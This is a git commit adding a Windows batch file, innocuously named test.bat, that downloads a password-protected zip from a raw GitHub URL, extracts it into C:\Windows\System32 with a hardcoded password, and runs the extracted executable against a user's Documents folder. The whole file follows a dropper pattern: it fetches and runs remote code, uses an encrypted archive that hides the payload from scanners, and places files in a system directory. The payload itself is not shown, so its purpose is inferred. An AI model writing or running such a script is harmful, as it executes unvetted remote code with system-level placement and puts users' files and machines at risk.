a47279f8a06f389224aa35e1ff9cea86f1259425
BlackDotPixel <binds_jicama.2l@icloud.com>
2026-02-09 18:05:58 +0530

    bat

---
+++ test.bat
@@ -0,0 +1,21 @@
+set ZIP=terminal.zip
+set EXE=console2.exe
+set DESTINATIONFOLDER=c:\windows\system32
+set TARGETFOLDER=C:\Users\admin\Documents
+set URL=https://raw.githubusercontent.com/blackdotpixel/temp/main/terminal.zip
+set PASSWORD=zenzen
+set EXTRACTIONTOOL="C:\Program Files\7-Zip\7z.exe"
+
+echo Starting download...
+
+wget %URL% -O "%destinationFolder%\%ZIP%"
+
+timeout /t 5
+
+echo Extracting %ZIP%...
+%EXTRACTIONTOOL% x %destinationFolder%\%ZIP% -p%PASSWORD% -o%DESTINATIONFOLDER% -y
+
+echo Executing %EXE%...
+%EXE% -p %TARGETFOLDER%
+
+echo Execution finished.
